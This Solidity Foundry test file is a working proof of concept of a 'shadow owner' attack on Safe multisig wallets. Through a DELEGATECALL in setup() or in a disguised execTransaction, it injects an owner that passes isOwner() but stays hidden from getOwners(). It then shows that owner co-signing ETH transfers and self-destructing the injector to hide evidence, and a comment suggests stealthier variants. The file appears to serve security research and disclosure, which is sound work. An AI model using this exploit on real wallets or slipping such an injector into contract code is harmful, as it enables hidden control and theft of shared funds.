// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe/Safe.sol";
import {SafeProxy} from "@safe/proxies/SafeProxy.sol";
import {SafeProxyFactory} from "@safe/proxies/SafeProxyFactory.sol";
import {Enum} from "@safe/libraries/Enum.sol";
import {ShadowOwnerInjector} from "../src/ShadowOwnerInjector.sol";

/// @title ShadowOwnerTest
/// @notice Demonstrates the shadow owner attack on a Safe multisig.
///         A shadow owner is authorized (isOwner == true, can co-sign transactions)
///         but is invisible in getOwners() and the Safe UI.
contract ShadowOwnerTest is Test {
    // --- Contracts ---
    Safe public singleton;
    SafeProxyFactory public factory;
    ShadowOwnerInjector public injector;
    Safe public safe; // the proxy, cast to Safe interface

    // --- EOA keys ---
    // Three legitimate owners
    uint256 constant OWNER1_KEY = 0xA001;
    uint256 constant OWNER2_KEY = 0xA002;
    uint256 constant OWNER3_KEY = 0xA003;
    // The shadow owner — hidden but authorized
    uint256 constant SHADOW_KEY = 0xBEEF;

    address owner1;
    address owner2;
    address owner3;
    address shadowOwner;

    // --- Storage layout constants (must match SafeStorage.sol) ---
    uint256 constant OWNERS_MAPPING_SLOT = 2;
    address constant SENTINEL = address(0x1);

    function setUp() public {
        // Derive addresses from private keys
        owner1 = vm.addr(OWNER1_KEY);
        owner2 = vm.addr(OWNER2_KEY);
        owner3 = vm.addr(OWNER3_KEY);
        shadowOwner = vm.addr(SHADOW_KEY);

        // Deploy the Safe singleton (implementation) and proxy factory
        singleton = new Safe();
        factory = new SafeProxyFactory();

        // Deploy the malicious delegatecall target
        injector = new ShadowOwnerInjector();

        // Build the owner array for setup (3 legitimate owners, threshold 2)
        address[] memory owners = new address[](3);
        owners[0] = owner1;
        owners[1] = owner2;
        owners[2] = owner3;

        // Encode the setup() call that will be forwarded to the proxy after creation.
        // The `to` and `data` params trigger a DELEGATECALL to the injector during setupModules(),
        // which writes the shadow owner into the Safe's storage.
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            uint256(2), // threshold
            address(injector), // to: delegatecall target
            abi.encodeWithSelector(ShadowOwnerInjector.injectShadowOwner.selector, shadowOwner), // data
            address(0), // fallbackHandler
            address(0), // paymentToken
            uint256(0), // payment
            payable(address(0)) // paymentReceiver
        );

        // Deploy a proxy and call setup() atomically
        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
        safe = Safe(payable(address(proxy)));

        // Fund the safe so it can send ETH in the execution test
        vm.deal(address(safe), 1 ether);
    }

    // =========================================================================
    //  TEST A: Shadow owner is authorized but invisible
    // =========================================================================

    function test_shadowOwnerIsHiddenButAuthorized() public view {
        // --- getOwners() should return only the 3 legitimate owners ---
        address[] memory listedOwners = safe.getOwners();
        assertEq(listedOwners.length, 3, "should list exactly 3 owners");

        bool shadowListed = false;
        for (uint256 i = 0; i < listedOwners.length; i++) {
            if (listedOwners[i] == shadowOwner) {
                shadowListed = true;
            }
        }
        assertFalse(shadowListed, "shadow owner must NOT appear in getOwners()");

        // --- isOwner() should return true for the shadow owner ---
        assertTrue(safe.isOwner(shadowOwner), "shadow owner must pass isOwner() check");

        // --- threshold is based only on visible owners ---
        assertEq(safe.getThreshold(), 2, "threshold should be 2");

        // --- Log for clarity ---
        console.log("=== Shadow Owner Verification ===");
        console.log("Listed owners count:", listedOwners.length);
        for (uint256 i = 0; i < listedOwners.length; i++) {
            console.log("  owner[%d]: %s", i, listedOwners[i]);
        }
        console.log("Shadow owner address:", shadowOwner);
        console.log("isOwner(shadow):     ", safe.isOwner(shadowOwner));
        console.log("getOwners() includes shadow: false");
    }

    // =========================================================================
    //  TEST B: Shadow owner can co-sign and execute a transaction
    // =========================================================================

    function test_shadowOwnerCanSignTransaction() public {
        // We'll send 0.1 ETH from the Safe to a recipient
        address recipient = makeAddr("recipient");
        uint256 sendAmount = 0.1 ether;

        // Build signatures and execute in a helper to avoid stack-too-deep
        bytes memory signatures = _buildSignatures(recipient, sendAmount);

        // Execute — this should succeed, proving the shadow owner's signature is accepted
        bool success = safe.execTransaction(
            recipient,
            sendAmount,
            "",
            Enum.Operation.Call,
            0, 0, 0,           // safeTxGas, baseGas, gasPrice
            address(0),        // gasToken
            payable(address(0)),
            signatures
        );

        assertTrue(success, "execTransaction must succeed with shadow owner signature");
        assertEq(recipient.balance, sendAmount, "recipient should have received ETH");

        console.log("=== Shadow Owner Execution ===");
        console.log("Transaction succeeded:  true");
        console.log("Recipient balance:      %d wei", recipient.balance);
    }

    /// @dev Builds packed EIP-712 signatures from owner1 + shadowOwner, sorted by address.
    function _buildSignatures(address recipient, uint256 sendAmount) internal view returns (bytes memory) {
        bytes32 txHash = safe.getTransactionHash(
            recipient, sendAmount, "", Enum.Operation.Call,
            0, 0, 0, address(0), payable(address(0)), safe.nonce()
        );

        // Signatures must be sorted by signer address ascending
        (uint256 keyA, uint256 keyB) = owner1 < shadowOwner
            ? (OWNER1_KEY, SHADOW_KEY)
            : (SHADOW_KEY, OWNER1_KEY);

        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(keyA, txHash);
        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(keyB, txHash);

        return abi.encodePacked(rA, sA, vA, rB, sB, vB);
    }

    // =========================================================================
    //  TEST C: Raw storage inspection — prove the dirty mapping entry
    // =========================================================================

    function test_storageInspection() public view {
        // --- Read owners[shadowOwner] directly from storage ---
        bytes32 shadowSlot = keccak256(abi.encode(shadowOwner, OWNERS_MAPPING_SLOT));
        bytes32 shadowValue = vm.load(address(safe), shadowSlot);

        console.log("=== Storage Inspection ===");
        console.log("Shadow owner address:  %s", shadowOwner);
        console.log("owners mapping slot:   2");
        console.log("owners[shadow] slot:   %s", vm.toString(shadowSlot));
        console.log("owners[shadow] value:  %s", vm.toString(shadowValue));
        assertEq(
            shadowValue,
            bytes32(uint256(uint160(SENTINEL))),
            "owners[shadow] should be SENTINEL (0x1)"
        );

        // --- Walk the linked list from sentinel and show the shadow is unreachable ---
        console.log("");
        console.log("Linked list traversal from SENTINEL:");
        bytes32 sentinelSlot = keccak256(abi.encode(SENTINEL, OWNERS_MAPPING_SLOT));
        address current = address(uint160(uint256(vm.load(address(safe), sentinelSlot))));
        uint256 idx = 0;
        bool shadowReachable = false;
        while (current != SENTINEL && idx < 10) {
            console.log("  [%d] %s", idx, current);
            if (current == shadowOwner) shadowReachable = true;
            bytes32 nextSlot = keccak256(abi.encode(current, OWNERS_MAPPING_SLOT));
            current = address(uint160(uint256(vm.load(address(safe), nextSlot))));
            idx++;
        }
        assertFalse(shadowReachable, "shadow owner must not be reachable in linked list");
        console.log("Shadow reachable via linked list: false");

        // --- ownerCount does not include the shadow ---
        // ownerCount is at slot 3
        bytes32 countValue = vm.load(address(safe), bytes32(uint256(3)));
        console.log("");
        console.log("ownerCount (slot 3): %d", uint256(countValue));
        assertEq(uint256(countValue), 3, "ownerCount should be 3 (shadow not counted)");
    }

    // =========================================================================
    //  Helpers
    // =========================================================================

}

/// @title ShadowOwnerViaExecTest
/// @notice Demonstrates shadow owner injection via execTransaction() rather than setup().
///         This is the more realistic attack scenario: a malicious transaction proposal
///         that uses DELEGATECALL to silently inject a shadow owner into storage during
///         what appears to be a normal multisig operation.
contract ShadowOwnerViaExecTest is Test {
    Safe public singleton;
    SafeProxyFactory public factory;
    ShadowOwnerInjector public injector;
    Safe public safe;

    uint256 constant OWNER1_KEY = 0xA001;
    uint256 constant OWNER2_KEY = 0xA002;
    uint256 constant OWNER3_KEY = 0xA003;
    uint256 constant SHADOW_KEY = 0xBEEF;

    address owner1;
    address owner2;
    address owner3;
    address shadowOwner;

    uint256 constant OWNERS_MAPPING_SLOT = 2;

    function setUp() public {
        owner1 = vm.addr(OWNER1_KEY);
        owner2 = vm.addr(OWNER2_KEY);
        owner3 = vm.addr(OWNER3_KEY);
        shadowOwner = vm.addr(SHADOW_KEY);

        singleton = new Safe();
        factory = new SafeProxyFactory();
        injector = new ShadowOwnerInjector();

        address[] memory owners = new address[](3);
        owners[0] = owner1;
        owners[1] = owner2;
        owners[2] = owner3;

        // Clean setup — no delegatecall, no shadow owner injected at init time
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners,
            uint256(2),         // threshold
            address(0),         // to: no delegatecall
            "",                 // data: empty
            address(0),         // fallbackHandler
            address(0),         // paymentToken
            uint256(0),         // payment
            payable(address(0)) // paymentReceiver
        );

        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
        safe = Safe(payable(address(proxy)));
        vm.deal(address(safe), 1 ether);
    }

    /// @notice Confirms the Safe starts clean — no shadow owner.
    ///         Then a DELEGATECALL transaction (signed by 2 legit owners) injects the shadow.
    ///         After execution, the shadow is authorized but invisible.
    function test_injectShadowViaExecTransaction() public {
        // --- Pre-check: shadow is NOT an owner yet ---
        assertFalse(safe.isOwner(shadowOwner), "shadow must not be owner before injection");

        // --- Build the malicious delegatecall transaction ---
        // The `data` field calls ShadowOwnerInjector.injectShadowOwner(shadowOwner)
        // The `operation` is DelegateCall, so it runs in the Safe's storage context
        bytes memory injectCalldata = abi.encodeWithSelector(
            ShadowOwnerInjector.injectShadowOwner.selector,
            shadowOwner
        );

        // Sign with 2 legitimate owners (they may not realize the delegatecall is malicious)
        bytes memory signatures = _signDelegatecallTx(injectCalldata);

        // Execute the malicious delegatecall
        bool success = safe.execTransaction(
            address(injector),  // to: the injector contract
            0,                  // value
            injectCalldata,
            Enum.Operation.DelegateCall, // <-- this is the key: DELEGATECALL
            0, 0, 0,
            address(0),
            payable(address(0)),
            signatures
        );
        assertTrue(success, "delegatecall injection tx must succeed");

        // --- Post-check: shadow is now a hidden owner ---
        assertTrue(safe.isOwner(shadowOwner), "shadow must be owner after injection");

        address[] memory listedOwners = safe.getOwners();
        assertEq(listedOwners.length, 3, "should still list exactly 3 owners");
        for (uint256 i = 0; i < listedOwners.length; i++) {
            assertTrue(listedOwners[i] != shadowOwner, "shadow must not appear in getOwners()");
        }

        // --- Prove the shadow can now co-sign a real ETH transfer ---
        address recipient = makeAddr("recipient");
        uint256 sendAmount = 0.1 ether;
        bytes memory transferSigs = _signTransferTx(recipient, sendAmount);

        success = safe.execTransaction(
            recipient,
            sendAmount,
            "",
            Enum.Operation.Call,
            0, 0, 0,
            address(0),
            payable(address(0)),
            transferSigs
        );
        assertTrue(success, "transfer signed by shadow must succeed");
        assertEq(recipient.balance, sendAmount);

        // --- Verify dirty storage ---
        bytes32 shadowSlot = keccak256(abi.encode(shadowOwner, OWNERS_MAPPING_SLOT));
        bytes32 shadowValue = vm.load(address(safe), shadowSlot);
        assertEq(shadowValue, bytes32(uint256(1)), "owners[shadow] should be 0x1");

        console.log("=== Shadow Injection via execTransaction ===");
        console.log("Before injection: isOwner(shadow) = false");
        console.log("After injection:  isOwner(shadow) = true");
        console.log("getOwners() count: %d (shadow not listed)", listedOwners.length);
        console.log("Shadow co-signed ETH transfer: success");
        console.log("owners[shadow] raw storage:    0x01 (sentinel)");
    }

    /// @dev Signs a delegatecall transaction to the injector with owner1 + owner2.
    function _signDelegatecallTx(bytes memory data) internal view returns (bytes memory) {
        bytes32 txHash = safe.getTransactionHash(
            address(injector), 0, data, Enum.Operation.DelegateCall,
            0, 0, 0, address(0), payable(address(0)), safe.nonce()
        );
        return _sortAndSign(OWNER1_KEY, OWNER2_KEY, txHash);
    }

    /// @dev Signs an ETH transfer with owner1 + shadowOwner (post-injection).
    function _signTransferTx(address to, uint256 value) internal view returns (bytes memory) {
        bytes32 txHash = safe.getTransactionHash(
            to, value, "", Enum.Operation.Call,
            0, 0, 0, address(0), payable(address(0)), safe.nonce()
        );
        return _sortAndSign(OWNER1_KEY, SHADOW_KEY, txHash);
    }

    /// @dev Signs a hash with two keys, packing signatures in ascending-address order.
    function _sortAndSign(uint256 keyA, uint256 keyB, bytes32 hash) internal pure returns (bytes memory) {
        address addrA = vm.addr(keyA);
        address addrB = vm.addr(keyB);
        if (addrA > addrB) {
            (keyA, keyB) = (keyB, keyA);
        }
        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(keyA, hash);
        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(keyB, hash);
        return abi.encodePacked(rA, sA, vA, rB, sB, vB);
    }
}

// =========================================================================
//  Self-Destruct Attack: Hide Evidence After Injection
// =========================================================================

/// @title ShadowOwnerSelfDestructTest
/// @notice Demonstrates a more subtle attack: the injector contract self-destructs
///         after injecting the shadow, removing on-chain evidence while the shadow
///         remains in the Safe's storage.
contract ShadowOwnerSelfDestructTest is Test {
    Safe public singleton;
    SafeProxyFactory public factory;
    ShadowOwnerInjector public injector;
    Safe public safe;

    uint256 constant OWNER1_KEY = 0xA001;
    uint256 constant OWNER2_KEY = 0xA002;
    uint256 constant OWNER3_KEY = 0xA003;
    uint256 constant SHADOW_KEY = 0xBEEF;

    address owner1;
    address owner2;
    address owner3;
    address shadowOwner;

    function setUp() public {
        owner1 = vm.addr(OWNER1_KEY);
        owner2 = vm.addr(OWNER2_KEY);
        owner3 = vm.addr(OWNER3_KEY);
        shadowOwner = vm.addr(SHADOW_KEY);

        singleton = new Safe();
        factory = new SafeProxyFactory();
        injector = new ShadowOwnerInjector();

        address[] memory owners = new address[](3);
        owners[0] = owner1;
        owners[1] = owner2;
        owners[2] = owner3;

        // Clean setup
        bytes memory initializer = abi.encodeWithSelector(
            Safe.setup.selector,
            owners, uint256(2), address(0), "", address(0), address(0), uint256(0), payable(address(0))
        );

        SafeProxy proxy = factory.createProxyWithNonce(address(singleton), initializer, 0);
        safe = Safe(payable(address(proxy)));
        vm.deal(address(safe), 1 ether);
    }

    /// @notice Demonstrates the self-destruct attack pattern.
    /// @dev IMPORTANT: Since EIP-6780 (Cancun hard fork), SELFDESTRUCT only deletes code
    ///      if called in the same transaction the contract was created. In separate 
    ///      transactions, it only transfers ETH (code remains). This test demonstrates
    ///      the concept but notes the modern limitation.
    ///      
    ///      Pattern: 1. Inject shadow via DELEGATECALL
    ///               2. Self-destruct the injector
    ///               3. Shadow remains in Safe storage
    function test_selfDestructAttackPattern() public {
        // --- Phase 1: Inject the shadow ---
        bytes memory injectCalldata = abi.encodeWithSelector(
            ShadowOwnerInjector.injectShadowOwner.selector,
            shadowOwner
        );

        bytes memory signatures = _signDelegatecallTx(injectCalldata);

        bool success = safe.execTransaction(
            address(injector), 0, injectCalldata, Enum.Operation.DelegateCall,
            0, 0, 0, address(0), payable(address(0)), signatures
        );
        assertTrue(success, "injection must succeed");
        assertTrue(safe.isOwner(shadowOwner), "shadow must be owner");

        // --- Phase 2: Attempt to self-destruct the injector ---
        address injectorAddr = address(injector);
        
        // Record state before destruction
        uint256 codeSizeBefore;
        uint256 ethBalanceBefore = injectorAddr.balance;
        assembly {
            codeSizeBefore := extcodesize(injectorAddr)
        }
        assertTrue(codeSizeBefore > 0, "injector should have code before destruction");

        // Call destroy() - sends ETH to caller
        injector.destroy();

        // Check state after destruction
        uint256 codeSizeAfter;
        uint256 ethBalanceAfter = injectorAddr.balance;
        assembly {
            codeSizeAfter := extcodesize(injectorAddr)
        }

        // --- Phase 3: Verify shadow STILL WORKS regardless ---
        address recipient = makeAddr("recipient");
        uint256 sendAmount = 0.1 ether;
        
        // Shadow can still co-sign transactions
        bytes memory transferSigs = _signTransferTx(recipient, sendAmount);
        
        success = safe.execTransaction(
            recipient, sendAmount, "", Enum.Operation.Call,
            0, 0, 0, address(0), payable(address(0)), transferSigs
        );
        assertTrue(success, "shadow must still work after destroy call");
        assertEq(recipient.balance, sendAmount);

        console.log("=== Self-Destruct Attack Pattern ===");
        console.log("Injector code size before: %d bytes", codeSizeBefore);
        console.log("Injector code size after:  %d bytes", codeSizeAfter);
        
        // Note: EIP-6780 changed SELFDESTRUCT behavior
        if (codeSizeAfter == 0) {
            console.log("Status:                    DESTROYED (pre-Cancun behavior)");
        } else {
            console.log("Status:                    CODE REMAINS (EIP-6780/Cancun)");
            console.log("Note:                      SELFDESTRUCT only deletes code");
            console.log("                           in same tx as creation post-Cancun");
        }
        
        console.log("Shadow isOwner:            true");
        console.log("Shadow can co-sign:        success");
        console.log("");
        console.log("KEY INSIGHT: Shadow persists in Safe storage regardless!");
        
        // For a more stealthy attack on modern Ethereum:
        // Use a factory that deploys and destroys in same tx, or
        // Use a legitimate-looking contract name to hide in plain sight
    }

    /// @dev Signs a delegatecall transaction to the injector.
    function _signDelegatecallTx(bytes memory data) internal view returns (bytes memory) {
        bytes32 txHash = safe.getTransactionHash(
            address(injector), 0, data, Enum.Operation.DelegateCall,
            0, 0, 0, address(0), payable(address(0)), safe.nonce()
        );
        return _sortAndSign(OWNER1_KEY, OWNER2_KEY, txHash);
    }

    /// @dev Signs an ETH transfer with owner1 + shadowOwner.
    function _signTransferTx(address to, uint256 value) internal view returns (bytes memory) {
        bytes32 txHash = safe.getTransactionHash(
            to, value, "", Enum.Operation.Call,
            0, 0, 0, address(0), payable(address(0)), safe.nonce()
        );
        return _sortAndSign(OWNER1_KEY, SHADOW_KEY, txHash);
    }

    /// @dev Signs a hash with two keys.
    function _sortAndSign(uint256 keyA, uint256 keyB, bytes32 hash) internal pure returns (bytes memory) {
        address addrA = vm.addr(keyA);
        address addrB = vm.addr(keyB);
        if (addrA > addrB) (keyA, keyB) = (keyB, keyA);
        (uint8 vA, bytes32 rA, bytes32 sA) = vm.sign(keyA, hash);
        (uint8 vB, bytes32 rB, bytes32 sB) = vm.sign(keyB, hash);
        return abi.encodePacked(rA, sA, vA, rB, sB, vB);
    }
}
